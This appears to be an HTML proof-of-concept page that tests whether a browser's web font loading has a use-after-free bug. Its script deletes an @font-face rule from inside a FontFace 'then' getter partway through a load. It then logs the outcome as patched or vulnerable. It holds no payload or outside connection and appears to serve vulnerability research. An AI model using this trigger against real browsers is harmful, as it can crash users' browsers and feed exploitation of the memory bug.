<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>P2 v17</title>
<style>body{font-size:28px;font-family:sans-serif;background:#111;color:#0f0}pre{white-space:pre-wrap;font-size:22px}</style>
<style id="s0">@font-face { font-family: x; src: local(Helvetica Narrow); unicode-range: U+0042; }</style>
</head>
<body>
<h3 id="st">stage A</h3>
<pre id="out"></pre>
<script>
// Phase 2 v17: THE DISCRIMINATOR. The rule face is now LOADABLE (local font).
// After the getter deletes the rule mid-load:
//   resolve  -> the Ref<> fix held the face alive -> PATCHED on 14.23
//   hang/crash -> the face was freed mid-flight    -> VULNERABLE (UAF live)
// Previous hang was innocent: nonexistent-font.woff could never complete.
function log(s) { document.getElementById('out').textContent += s + "\n"; }

log('PAGE VERSION: v17 (loadable-rule discriminator)');
log('UA = ' + navigator.userAgent);

function control() {
  // CONTROL (no trigger): the same load WITHOUT any deletion must resolve.
  var B = new FontFace('c', 'local(Helvetica)', { unicodeRange: 'U+0041' });
  document.fonts.add(B);
  void B.loaded;
  document.fonts.load('1em c', 'AB').then(
    function (f) { log('CONTROL load resolved: ' + (f ? f.length : '?') + ' faces - good'); },
    function (e) { log('CONTROL load rejected: ' + e + ' - local fonts unavailable, test invalid'); });
}

function trigger() {
  log('stage B: trigger in 3s');
  setTimeout(function () {
    log('triggering (loadable rule face)');

    var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;

    var fired = 0;
    Object.defineProperty(FontFace.prototype, 'then', {
      configurable: true,
      get: function () {
        fired++;
        if (this === A && fired === 1) {
          log('GETTER FIRED - deleting rule now');
          try { document.getElementById('s0').sheet.deleteRule(0); } catch (e) {}
          document.body.offsetTop;
        }
        return undefined;
      }
    });

    try {
      document.fonts.load('1em x', 'AB').then(
        function (f) {
          log('load RESOLVED with ' + (f ? f.length : '?') + ' faces');
          log('=> FACE SURVIVED THE DELETE = Ref<> fix present = PATCHED');
        },
        function (e) {
          log('load rejected: ' + e);
          log('=> face failed after delete - ambiguous, examine error');
        });
    } catch (e) { log('load threw: ' + e); }

    setTimeout(function () {
      log('no resolve after 5s => promise hung on the deleted face');
      log('=> face could NOT complete after free = VULNERABLE (or rule-removal starves U+0042)');
    }, 5000);
  }, 3000);
}

log('armed - control first, then trigger');
control();
window.onload = trigger;
</script>
</body>
</html>
